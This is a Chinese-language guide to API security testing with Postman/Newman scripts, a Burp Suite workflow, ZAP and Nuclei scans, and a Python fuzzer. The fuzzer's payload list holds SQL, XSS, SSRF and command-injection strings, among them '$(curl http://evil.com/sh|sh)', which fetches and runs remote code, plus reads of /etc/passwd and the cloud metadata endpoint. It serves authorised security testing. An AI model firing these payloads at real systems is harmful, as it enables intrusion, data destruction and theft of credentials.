# API安全测试

### 5.1 Postman/Newman API安全测试

```javascript
// Postman测试脚本 - BOLA检测
// 在Tests标签页中编写

pm.test("BOLA检测 - 尝试访问其他用户资源", function () {
    // 获取当前用户token
    const userToken = pm.environment.get("user_token");
    const otherUserId = pm.environment.get("other_user_id");

    // 发送请求访问他人资源
    pm.sendRequest({
        url: pm.environment.get("base_url") + `/api/v2/users/${otherUserId}`,
        method: 'GET',
        header: {
            'Authorization': `Bearer ${userToken}`
        }
    }, function (err, response) {
        // 预期: 403 Forbidden
        pm.expect(response.code).to.equal(403);
        if (response.code === 200) {
            console.log("[!] BOLA漏洞发现: 可访问其他用户数据");
        }
    });
});

// JWT安全检测
pm.test("JWT alg=none检测", function () {
    const token = pm.environment.get("access_token");
    const parts = token.split('.');
    const header = JSON.parse(atob(parts[0]));

    // 检查是否接受none算法
    pm.expect(header.alg).to.not.equal("none");
});

// 速率限制测试
pm.test("速率限制检测", function () {
    const url = pm.environment.get("base_url") + "/api/v2/auth/login";
    let blocked = 0;

    // 发送20个并发请求
    for (let i = 0; i < 20; i++) {
        pm.sendRequest({
            url: url,
            method: 'POST',
            header: {'Content-Type': 'application/json'},
            body: {mode: 'raw', raw: JSON.stringify({
                username: "test",
                password: "wrong"
            })}
        }, function (err, response) {
            if (response.code === 429) blocked++;
        });
    }
    // 至少有一些请求应该被阻止
    setTimeout(() => {
        pm.expect(blocked).to.be.above(0);
    }, 3000);
});
```

**Newman命令行执行：**

```bash
# 运行API安全测试套件
newman run api-security-tests.postman_collection.json \
  -e production-env.postman_environment.json \
  --reporters cli,html \
  --reporter-html-export security-report.html \
  --delay-request 500

# CI/CD集成
newman run api-security-tests.json --env-var "base_url=$API_URL" \
  --bail --timeout-request 10000
```

### 5.2 Burp Suite API测试

```
Burp Suite API安全测试流程:

1. API发现
   ├── 被动扫描: 代理浏览器流量，自动发现API端点
   ├── 主动扫描: 使用OpenAPI文件批量导入端点
   └── 内容发现: 爆破API路径(/api/v1/, /api/v2/, /api/internal/)

2. 认证测试
   ├── 篡改JWT: 修改payload中的role字段
   ├── 算法降级: 将RS256改为HS256
   ├── None算法: 移除签名部分
   └── Token重放: 在不同IP/UA使用同一Token

3. 授权测试(BOLA/BFLA)
   ├── ID枚举: 遍历user_id/order_id
   ├── 水平越权: User A访问User B的资源
   ├── 垂直越权: 普通用户调用管理接口
   └── HTTP方法篡改: GET改DELETE/PUT

4. 注入测试
   ├── SQL注入: 参数中注入' OR 1=1--
   ├── NoSQL注入: {"$gt": ""}
   ├── 命令注入: ; cat /etc/passwd
   └── SSRF: url参数指向169.254.169.254

5. 业务逻辑测试
   ├── 重复提交: 重复使用优惠券
   ├── 竞态条件: 并发购买库存
   ├── 参数篡改: 修改价格/数量为负数
   └── 工作流绕过: 跳过支付步骤
```

### 5.3 自动化API安全扫描工具

**OWASP ZAP API扫描：**

```bash
# 基于OpenAPI文件的API扫描
zap-cli -t https://api.example.com \
  -z "-openapiapi=swagger.json" \
  -c api-security-policy \
  -r zap-report.html

# 命令行模式
zap-cli quick-scan -r api-scan-report.html \
  -z "-config api.enable=true" \
  https://api.example.com/api/v2/users

# 自动化脚本
docker run -t owasp/zap2docker-stable zap-baseline.py \
  -t https://api.example.com \
  -c api-security-context.conf
```

**Nuclei模板扫描：**

```yaml
# nuclei API安全检测模板
id: api-security-scan

info:
  name: API Security Detection
  author: security-team
  severity: high

requests:
  # JWT none算法检测
  - raw:
      - |
        GET /api/v2/users/me HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{jwt_none_token}}

    matchers:
      - type: status
        status:
          - 200  # 如果返回200说明接受none算法

  # BOLA检测
  - raw:
      - |
        GET /api/v2/users/{{user_id_increment}} HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{valid_token}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200  # 预期403，如果200则存在BOLA
      - type: word
        words:
          - "email"
        negative: true
```

```bash
# 执行Nuclei扫描
nuclei -t api-security-templates/ -u https://api.example.com \
  -rl 10 -c 5 -timeout 10 -o results.txt

# 批量扫描多个API
nuclei -l api-targets.txt -t api-templates/ \
  -severity high,critical -json -o results.json
```

### 5.4 API模糊测试

```python
# API模糊测试框架示例
import itertools
import string

class APIFuzzer:
    """API端点模糊测试"""

    PAYLOADS = {
        'sqli': [
            "' OR '1'='1' --",
            "' UNION SELECT NULL,NULL--",
            "1; DROP TABLE users--",
            "admin'--",
            "' OR SLEEP(5)--",
        ],
        'xss': [
            "<script>alert(1)</script>",
            "\"><img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "<svg/onload=alert(1)>",
        ],
        'ssrf': [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:8080",
            "file:///etc/passwd",
            "http://10.0.0.1/admin",
        ],
        'cmdi': [
            "; cat /etc/passwd",
            "| whoami",
            "`id`",
            "$(curl http://evil.com/sh|sh)",
        ],
        'nosql': [
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$regex": ".*"}',
        ],
    }

    @classmethod
    def fuzz_endpoint(cls, base_url, endpoint, method='GET',
                      params=None, headers=None):
        """对API端点执行模糊测试"""
        results = []
        url = base_url + endpoint

        for payload_type, payloads in cls.PAYLOADS.items():
            for payload in payloads:
                test_params = dict(params) if params else {}
                # 对每个参数注入payload
                for param_name in test_params:
                    original = test_params[param_name]
                    test_params[param_name] = payload

                    response = cls._send_request(
                        url, method, test_params, headers
                    )

                    finding = cls._analyze_response(
                        response, payload_type, payload, param_name
                    )
                    if finding:
                        results.append(finding)

                    test_params[param_name] = original  # 恢复

        return results

    @staticmethod
    def _analyze_response(response, payload_type, payload, param):
        """分析响应判断是否成功"""
        indicators = {
            'sqli': ['SQL syntax', 'mysql_', 'ORA-', 'SQLException'],
            'xss': ['<script>', 'alert(1)', 'onerror'],
            'ssrf': ['ami-id', 'instance-id', 'security-credentials'],
            'cmdi': ['root:', 'uid=', 'www-data'],
        }

        finding = None
        if response and response.status_code == 500:
            indicators_list = indicators.get(payload_type, [])
            for indicator in indicators_list:
                if indicator.lower() in response.text.lower():
                    finding = {
                        'type': payload_type,
                        'param': param,
                        'payload': payload,
                        'indicator': indicator,
                        'status_code': response.status_code,
                        'severity': 'HIGH',
                    }
                    break
        return finding
```

---

---

